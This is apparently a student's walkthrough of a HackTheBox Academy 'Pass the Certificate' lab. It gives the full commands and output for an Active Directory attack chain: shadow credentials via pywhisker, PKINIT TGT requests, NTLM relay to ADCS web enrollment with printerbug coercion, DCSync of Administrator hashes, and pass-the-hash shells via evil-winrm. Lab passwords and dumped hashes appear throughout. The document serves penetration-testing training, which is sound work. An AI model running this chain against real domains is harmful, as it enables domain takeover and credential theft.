### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Pass The Certificate (PtC) <br>
<mark>hook it up with a follow if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>

---

IPs:

DC:    10.129.234.174   (ACADEMY-PWATTCK-PTCDC01)
CA:    10.129.246.22    (ACADEMY-PWATTCK-PTCCA01)

<br>

user: wwhite  password: package5shores_topher1

Make sure to add this line to your /etc/hosts file, replace with your DC ipv4:

	10.129.234.174   DC01.INLANEFREIGHT.LOCAL DC01

Go ahead and install this, you'll need it for both questions:
```diff
+ $ pip3 install -I git+https://github.com/wbond/oscrypto.git
```

---

### Question 1:
What are the contents of flag.txt on jpinkman's desktop?

Clone the pywhisker repo and make sure to install the reqs once in the dir:
```diff
+ $ git clone https://github.com/ShutdownRepo/pywhisker.git
+ $ cd pywhisker
+ $ pip install -r requirements.txt
```

Now make sure you're in the correct dir and run it with these flags. This will create an x.509 certificate, and write that public key to jpinkman's msDS-KeyCredentialLink attribute:
```diff
+ $ python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

	[*] Searching for the target account
	[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
	[*] Generating certificate
	[*] Certificate generated
	[*] Generating KeyCredential
	[*] KeyCredential generated with DeviceID: 9ff0ba62-c469-7287-bf0f-6ca38bd15f29
	[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
	[+] Updated the msDS-KeyCredentialLink attribute of the target object
	[*] Converting PEM -> PFX with cryptography: H5Di7hY0.pfx
	[+] PFX exportiert nach: H5Di7hY0.pfx
	[i] Passwort für PFX: q6bIXr6eYBroLwlCsQqK
	[+] Saved PFX (#PKCS12) certificate & key at path: H5Di7hY0.pfx
	[*] Must be used with password: q6bIXr6eYBroLwlCsQqK
	[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

Now clone the PKINITtools repo:
```diff
+ $ git clone https://github.com/dirkjanm/PKINITtools.git
+ $ cd PKINITtools
```

Now we can run the gettgtpkinit.py with these flags to save pinkman's TGT to a .ccache in your /tmp dir:
```diff
+ $ python3 gettgtpkinit.py -cert-pfx /home/htb-ac-830862/pywhisker/pywhisker/H5Di7hY0.pfx -pfx-pass 'q6bIXr6eYBroLwlCsQqK' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

	2025-10-24 15:17:18,460 minikerberos INFO     Loading certificate and key from file
	INFO:minikerberos:Loading certificate and key from file
	2025-10-24 15:17:18,487 minikerberos INFO     Requesting TGT
	INFO:minikerberos:Requesting TGT
	2025-10-24 15:17:43,881 minikerberos INFO     AS-REP encryption key (you might need this later):
	INFO:minikerberos:AS-REP encryption key (you might need this later):
	2025-10-24 15:17:43,881 minikerberos INFO     caa5e6b449ab8f6a13463fe0d31976b1fcfa70dfc0ef2c88ec0823384b41d7b2
	INFO:minikerberos:caa5e6b449ab8f6a13463fe0d31976b1fcfa70dfc0ef2c88ec0823384b41d7b2
	2025-10-24 15:17:43,885 minikerberos INFO     Saved TGT to file
	INFO:minikerberos:Saved TGT to file

Now make sure to export the KRB5CCNAME variable:
```diff
+ $ export KRB5CCNAME=/tmp/jpinkman.ccache
```

Before we can use a tool like evil-winrm to connect, we have to setup our /etc/krb5.conf with the correct info:
```diff
+ $ sudo nano /etc/krb5.conf
```

And add (make sure to use your DC ip):

	[libdefaults]  
	    default_realm = INLANEFREIGHT.LOCAL  
	    dns_lookup_realm = false  
	    dns_lookup_kdc = false
	
	[realms]  
	    INLANEFREIGHT.LOCAL = {  
	        kdc = 10.129.234.174  
	    }
	[domain_realm]  
	    .inlanefreight.local = INLANEFREIGHT.LOCAL  
	    inlanefreight.local = INLANEFREIGHT.LOCAL

Sally sells sea shells by the sea shore:
```diff
+ $ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

This will pop a shell under jpinkman, find his desktop and cat the flag.

🚩 found **3d7e3dfb56b200ef--edit--715cfc300f07f3f8**.

---

### Question 2:
What are the contents of flag.txt on Administrator's desktop?

If we go to http://10.129.246.22/certserv we can see the CA portal is up. Let's use the ntlmrelayx feature of impacket to relay sniffed connections to that web enrollment:
```diff
+ $ impacket-ntlmrelayx -t http://10.129.246.22/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

	Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
	[*] Setting up WCF Server on port 9389
	[*] Setting up RAW Server on port 6666
	
	[*] Servers started, waiting for connections

This next part requires impacket-ntlmrelayx 0.12 or higher to write a proper PKCS#12 (.pfx) cert. Older versions will write a base64 version of the cert. Use `certipy` to enumerate the --template name on a real pentest.

Let's clone the krbrelayx repo on the attack box:
```diff
+ $ git clone https://github.com/dirkjanm/krbrelayx.git && cd krbrelayx
```

This will allow us to force a host in the domain to connect to our relay. We can use the printerbug.py script within krbrelayx. The first ip will be the domain controller and the second will be our attack host (relay):
```diff
+ $ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.15.222
```

	[*] Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
	
	[*] Attempting to trigger authentication via rprn RPC at 10.129.234.174
	[*] Bind OK
	[*] Got handle

The connection will be received in our ntlmrelayx terminal:

	[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.174, attacking target http://10.129.246.22
	
	[*] HTTP server returned error code 200, treating as a successful login
	[*] Authenticating against http://10.129.246.22 as INLANEFREIGHT/DC01$ SUCCEED
	[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.174, attacking target http://10.129.246.22
	[-] Authenticating against http://10.129.246.22 as / FAILED
	[*] Generating CSR...
	[*] CSR generated!
	[*] Getting certificate...
	[*] GOT CERTIFICATE! ID 13
	[*] Writing PKCS#12 certificate to ./DC01$.pfx
	[*] Certificate successfully written to file

This wrote out our cert to `./DC01$.pfx`. Now we have a cert and we can 'pass it' for a TGT with PKINITtools:
```diff
+ $ cd PKINITtools
+ $ python3 -m venv .venv
+ $ source .venv/bin/activate
+ $ pip3 install -r requirements.txt
```

tip: If you encounter an "Error detecting the version of libcrypto", it's usually due to a missing oscrypto library.

Now we use gettgtpkinit.py to request a TGT with our cert:
```diff
+ $ python3 gettgtpkinit.py -cert-pfx /home/htb-ac-830862/DC01$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

	2025-10-24 16:37:14,604 minikerberos INFO     Loading certificate and key from file
	2025-10-24 16:37:14,906 minikerberos INFO     Requesting TGT
	2025-10-24 16:37:26,975 minikerberos INFO     AS-REP encryption key (you might need this later):
	2025-10-24 16:37:26,975 minikerberos INFO     6220f3026e67d0b10707add968fd425578bc443436f1e9adaba939d150602014
	2025-10-24 16:37:26,982 minikerberos INFO     Saved TGT to file

And boom goes the dynamite. Its saved in our /tmp dir. Now we can pass the ticket, from the left side. We now have privilege to do a DCSync attack to get ntlm's of domain accounts.

Firstly, exit your virt env:
```diff
+ $ deactivate
```

Then export your ticket to the krb5 ccname:
```diff
+ $ export KRB5CCNAME=/tmp/dc.ccache
```

Now we can grab the Admin hashes with Impacket's secretsdump tool:
```diff
+ $ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

	Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
	
	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Using the DRSUAPI method to get NTDS.DIT secrets
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::
	[*] Kerberos keys grabbed
	Administrator:aes256-cts-hmac-sha1-96:ec2223ff4c0bce238aa04d30be0fe9e634495f9449c0c25307c66d7c12d8f93a
	Administrator:aes128-cts-hmac-sha1-96:ffb8855b50dd1bf538c8001620c4f1d1
	Administrator:des-cbc-md5:a1f262b50b64c46b
	[*] Cleaning up...

Now that we have the ntlm hashes we can do a PtH attack to login, make sure you're using the NT hash from the secretsdump:
```diff
+ $ evil-winrm -i 10.129.234.174 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```

This will pop an admin shell. Traverse to the desktop and cat the flag, baby.

🚩 found **a1fc497a8433f5a1b--edit--4c18274019a2cdb**.
